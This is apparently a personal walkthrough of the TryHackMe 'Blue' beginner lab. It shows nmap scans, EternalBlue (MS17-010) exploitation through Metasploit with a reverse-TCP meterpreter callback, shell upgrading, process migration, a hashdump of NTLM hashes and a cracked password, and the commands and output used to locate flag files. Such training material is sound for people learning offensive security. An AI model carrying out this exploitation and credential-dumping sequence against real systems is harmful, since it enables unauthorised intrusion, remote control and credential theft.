![[Pasted image 20230430195736.png]]

# Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.** 

![](https://i.imgur.com/NhZIt9S.png)

_Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) - [Blue Merch](https://www.redbubble.com/shop/ap/53637482) - [Twitter](https://twitter.com/Vargnaar)_
_Link to Ice, the sequel to Blue: [Link](https://tryhackme.com/room/ice)_
_You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)_

-----------------------------------------

The virtual machine used in this room (Blue) can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html)[](https://darkstar7471.com/resources.html)

_Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter._

## Answer the questions below

### Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

nmap -sCV -Pn 10.10.222.187
nmap -sV -vv --script vuln 10.10.222.187

```bash
┌──(root㉿kali)-[~]
└─# nmap -sCV -Pn 10.10.222.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 01:01 UTC
Nmap scan report for ip-10-10-222-187.eu-west-1.compute.internal (10.10.222.187)
Host is up (0.0078s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-05-01T01:02:56+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-05-01T01:02:41+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-04-30T01:00:27
|_Not valid after:  2023-10-30T01:00:27
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:63:7A:BB:E8:F7 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-30T20:02:42-05:00
| smb2-time: 
|   date: 2023-05-01T01:02:41
|_  start_date: 2023-05-01T01:00:25
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02637abbe8f7 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.87 seconds

┌──(root㉿kali)-[~]
└─# nmap -sV -vv --script vuln 10.10.222.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 01:05 UTC
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:05
Completed NSE at 01:05, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:05
Completed NSE at 01:05, 0.00s elapsed
Initiating ARP Ping Scan at 01:05
Scanning 10.10.222.187 [1 port]
Completed ARP Ping Scan at 01:05, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:05
Completed Parallel DNS resolution of 1 host. at 01:05, 0.00s elapsed
Initiating SYN Stealth Scan at 01:05
Scanning ip-10-10-222-187.eu-west-1.compute.internal (10.10.222.187) [1000 ports]
Discovered open port 3389/tcp on 10.10.222.187
Discovered open port 49154/tcp on 10.10.222.187
Discovered open port 49159/tcp on 10.10.222.187
Discovered open port 49153/tcp on 10.10.222.187
Discovered open port 445/tcp on 10.10.222.187
Discovered open port 139/tcp on 10.10.222.187
Discovered open port 135/tcp on 10.10.222.187
Discovered open port 49158/tcp on 10.10.222.187
Discovered open port 49152/tcp on 10.10.222.187
Completed SYN Stealth Scan at 01:05, 1.37s elapsed (1000 total ports)
Initiating Service scan at 01:05
Scanning 9 services on ip-10-10-222-187.eu-west-1.compute.internal (10.10.222.187)
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 01:08 (0:01:48 remaining)
Completed Service scan at 01:07, 81.17s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.222.187.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:07
NSE Timing: About 99.91% done; ETC: 01:07 (0:00:00 remaining)
Completed NSE at 01:08, 60.26s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:08
NSE: [ssl-ccs-injection 10.10.222.187:3389] No response from server: ERROR
Completed NSE at 01:08, 0.38s elapsed
Nmap scan report for ip-10-10-222-187.eu-west-1.compute.internal (10.10.222.187)
Host is up, received arp-response (0.0017s latency).
Scanned at 2023-05-01 01:05:49 UTC for 143s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE        REASON          VERSION
135/tcp   open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server? syn-ack ttl 128
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49158/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49159/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 02:63:7A:BB:E8:F7 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:08
Completed NSE at 01:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:08
Completed NSE at 01:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.83 seconds
           Raw packets sent: 1112 (48.912KB) | Rcvd: 1001 (40.064KB)


```

### How many ports are open with a port number under 1000?
3 (135,139,445)

###  What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
ms17-010

------------------------------------------
# Task 2  Gain Access

Exploit the machine and gain a foothold.

Answer the questions below

### Start [Metasploit](https://tryhackme.com/module/metasploit)

msfconsole
```bash
──(root㉿kali)-[~]
└─# msfconsole

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.2.23-dev                          ]
+ -- --=[ 2259 exploits - 1188 auxiliary - 402 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce                                                                

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp                                                 
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.222.187                                                   
RHOSTS => 10.10.222.187                                                                                                      
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options                                                                
                                                                                                                             
Module options (exploit/windows/smb/ms17_010_eternalblue):                                                                   
                                                                                                                             
   Name           Current Setting  Required  Description                                                                     
   ----           ---------------  --------  -----------                                                                     
   RHOSTS         10.10.222.187    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
                                             ing-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.100.121    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


```

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
exploit/windows/smb/ms17_010_eternalblue

### Show options and set the one required value. What is the name of this value? (All caps for submission)
setg RHOSTS 10.10.222.187

### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
`set payload windows/x64/shell/reverse_tcp`
### With that done, run the exploit!  

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.130.18:4444 
[*] 10.10.48.126:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.48.126:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.48.126:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.48.126:445 - The target is vulnerable.
[*] 10.10.48.126:445 - Connecting to target for exploitation.
[+] 10.10.48.126:445 - Connection established for exploitation.
[+] 10.10.48.126:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.48.126:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.48.126:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.48.126:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.48.126:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.48.126:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.48.126:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.48.126:445 - Sending all but last fragment of exploit packet
[*] 10.10.48.126:445 - Starting non-paged pool grooming
[+] 10.10.48.126:445 - Sending SMBv2 buffers
[+] 10.10.48.126:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.48.126:445 - Sending final SMBv2 buffers.
[*] 10.10.48.126:445 - Sending last fragment of exploit packet!
[*] 10.10.48.126:445 - Receiving response from exploit packet
[+] 10.10.48.126:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.48.126:445 - Sending egg to corrupted connection.
[*] 10.10.48.126:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.48.126
[*] Meterpreter session 1 opened (10.10.130.18:4444 -> 10.10.48.126:49701) at 2023-05-01 02:13:30 +0000
[+] 10.10.48.126:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.48.126:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.48.126:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > dir
Listing: C:\Windows\system32
============================

```


Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.


------------------------------------------
# Task 3  Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

## Answer the questions below

### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
Google this: shell_to_meterpreter
post/multi/manage/shell_to_meterpreter

### Select this (use MODULE_PATH). Show options, what option are we required to change?
SESSION

### Set the required option, you may need to list all of the sessions to find your target here. 
sessions -l

### Run! If this doesn't work, try completing the exploit from the previous task once more.
Command: run (or exploit)

### Once the meterpreter shell conversion completes, select that session for use.
sessions SESSION_NUMBER

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

```bash
meterpreter > shell
Process 1356 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   668   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 492   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 552   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 568   560   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 616   560   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 628   608   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 668   608   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 716   616   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 724   616   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 732   616   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 844   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 912   716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 960   716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1056  716   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\
                                                                                mscorsvw.exe
 1124  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1228  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1356  3832  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1364  568   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1368  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1452  716   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.e
                                                                                xe
 1532  716   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1672  716   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Co
                                                                                nfig.exe
 1772  1056  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\
                                                                                mscorsvw.exe
 1972  716   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1996  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2072  716   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.3031
                                                                                9\mscorsvw.exe
 2116  844   WmiPrvSE.exe
 2232  716   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2244  716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2376  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2580  716   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2620  716   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 3832  716   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

meterpreter > migrate 3832
[-] Process already running at PID 3832

```

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

------------------------------------------
# Task 4  Cracking

Dump the non-default user's password and crack it!

## Answer the questions below

### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
Jon

### Copy this password hash to a file and research how to crack it. What is the cracked password?
alqfna22

https://crackstation.net/
![[Pasted image 20230430212722.png]]


------------------------------------------
# Task 5  Find flags!

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

_Completed Blue? Check out Ice: [Link](https://tryhackme.com/room/ice)_

_You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)_

## Answer the questions below

### Flag1? _This flag can be found at the system root._ 

```bash
C:\Windows\system32>dir c:\
dir c:\
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of c:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  21,032,435,712 bytes free

C:\Windows\system32>type c:\flag1.txt    
type c:\flag1.txt
flag{********************}
C:\Windows\system32>
```

### Flag2? _This flag can be found at the location where passwords are stored within Windows._
*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

```bash
meterpreter > shell
Process 2900 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

04/30/2023  09:43 PM    <DIR>          .
04/30/2023  09:43 PM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
03/17/2019  05:39 PM        18,087,936 COMPONENTS
03/17/2019  05:39 PM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
03/17/2019  02:56 PM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
03/17/2019  05:39 PM           262,144 SECURITY
03/17/2019  05:39 PM        39,583,744 SOFTWARE
04/30/2023  09:44 PM        12,582,912 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     71,069,730 bytes
               6 Dir(s)  21,103,149,056 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{***************************}
```

### flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

```bash
c:\Users\Jon\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of c:\Users\Jon\Desktop

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  21,032,435,712 bytes free

c:\Users\Jon\Desktop>cd ..
cd ..

c:\Users\Jon>cd documents
cd documents

c:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of c:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  21,032,435,712 bytes free

c:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{************************}

```